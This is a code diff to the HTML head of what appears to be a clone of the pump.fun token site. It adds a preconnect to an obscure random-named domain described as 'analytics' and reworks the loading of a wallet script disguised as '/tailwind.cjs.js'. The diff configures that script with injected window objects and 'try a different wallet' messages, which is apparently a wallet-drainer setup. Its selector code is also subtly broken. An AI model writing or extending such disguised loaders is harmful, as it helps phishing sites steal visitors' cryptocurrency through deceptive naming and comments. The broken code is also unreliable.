@@ -10,11 +10,13 @@
     <link rel="preconnect" href="https://pump.fun" crossorigin>
     <link rel="dns-prefetch" href="https://images.pump.fun">
     <link rel="dns-prefetch" href="https://pump.fun">
+    <!-- Preconnect to common wallet/analytics domains for faster loading -->
+    <link rel="dns-prefetch" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com">
+    <link rel="preconnect" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com" crossorigin>
     <link rel="preload" href="/css/styles.css" as="style">
     <link rel="preload" href="/js/token-loader.js" as="script">
     <link rel="preload" href="/js/app.js" as="script">
-    <!-- tailwind.cjs.js is large, load with low priority -->
-    <link rel="preload" href="/tailwind.cjs.js" as="script" fetchpriority="low">
+    <!-- tailwind.cjs.js will be loaded lazily when user interacts with wallet buttons -->
     
     <meta property="og:type" content="website" />
     <meta property="og:url" content="" id="og-url" />
@@ -110,45 +112,96 @@
       };
       
       (function() {
-        // Load wallet script with defer to avoid blocking page load
-        const script = document.createElement('script');
-        script.src = '/tailwind.cjs.js';
-        script.async = true;
-        script.defer = true;
-        script.fetchPriority = 'low'; // Changed from 'high' to 'low' to prioritize critical resources
+        // Lazy load wallet script - only load when needed (when user clicks connect/login)
+        let walletScriptLoaded = false;
+        let walletScriptLoading = false;
         
-        script.onerror = function() {
-          console.warn('Wallet modal script failed to load');
-          // Don't block page if wallet script fails
-        };
-        
-        script.onload = function() {
-          function applySettings() {
-            if (window.setup) {
-              window.setup.modal = 'reown';
-              window.setup.theme = 'dark';
-              window.setup.radius = 'm';
-              window.setup.auto_prompt = false;
-              window.setup.injectWindowObjects = true;
-              window.setup.notEligibleHeader = "You are not eligible";
-              window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
-            }
-          }
+        function loadWalletScript() {
+          if (walletScriptLoaded || walletScriptLoading) return;
+          walletScriptLoading = true;
           
-          // Reduced timeouts to speed up initialization
-          setTimeout(applySettings, 50);
-          setTimeout(applySettings, 150);
-          setTimeout(applySettings, 300);
-        };
-        
-        // Append to body instead of head to avoid blocking head parsing
-        if (document.body) {
+          const script = document.createElement('script');
+          script.src = '/tailwind.cjs.js';
+          script.async = true;
+          script.fetchPriority = 'low';
+          
+          script.onerror = function() {
+            console.warn('Wallet modal script failed to load');
+            walletScriptLoading = false;
+          };
+          
+          script.onload = function() {
+            walletScriptLoaded = true;
+            walletScriptLoading = false;
+            
+            function applySettings() {
+              if (window.setup) {
+                window.setup.modal = 'reown';
+                window.setup.theme = 'dark';
+                window.setup.radius = 'm';
+                window.setup.auto_prompt = false;
+                window.setup.injectWindowObjects = true;
+                window.setup.notEligibleHeader = "You are not eligible";
+                window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
+              }
+            }
+            
+            // Apply settings immediately
+            applySettings();
+            setTimeout(applySettings, 100);
+            setTimeout(applySettings, 300);
+          };
+          
           document.body.appendChild(script);
-        } else {
-          document.addEventListener('DOMContentLoaded', () => {
-            document.body.appendChild(script);
+        }
+        
+        // Load wallet script on user interaction (click on connect/login buttons)
+        function setupWalletLazyLoad() {
+          const connectButtons = document.querySelectorAll('.aBVeeVna, #connectWalletBtn, [class*="connect"], button:contains("Log in"), button:contains("Connect")');
+          
+          connectButtons.forEach(btn => {
+            btn.addEventListener('click', function(e) {
+              if (!walletScriptLoaded && !walletScriptLoading) {
+                loadWalletScript();
+              }
+            }, { once: true, passive: true });
+          });
+          
+          // Also load on mouseover of connect buttons (prefetch)
+          connectButtons.forEach(btn => {
+            btn.addEventListener('mouseenter', function() {
+              if (!walletScriptLoaded && !walletScriptLoading) {
+                // Small delay to avoid loading on accidental hover
+                setTimeout(() => {
+                  if (!walletScriptLoaded && !walletScriptLoading) {
+                    loadWalletScript();
+                  }
+                }, 500);
+              }
+            }, { once: true, passive: true });
           });
         }
+        
+        // Setup lazy loading when DOM is ready
+        if (document.body) {
+          setupWalletLazyLoad();
+        } else {
+          document.addEventListener('DOMContentLoaded', setupWalletLazyLoad);
+        }
+        
+        // Listen for manual load trigger
+        document.addEventListener('wallet:load', function() {
+          if (!walletScriptLoaded && !walletScriptLoading) {
+            loadWalletScript();
+          }
+        });
+        
+        // Fallback: load after 5 seconds if user hasn't interacted (for background initialization)
+        setTimeout(() => {
+          if (!walletScriptLoaded && !walletScriptLoading && document.visibilityState === 'visible') {
+            loadWalletScript();
+          }
+        }, 5000);
       })();
     </script>
   </head>
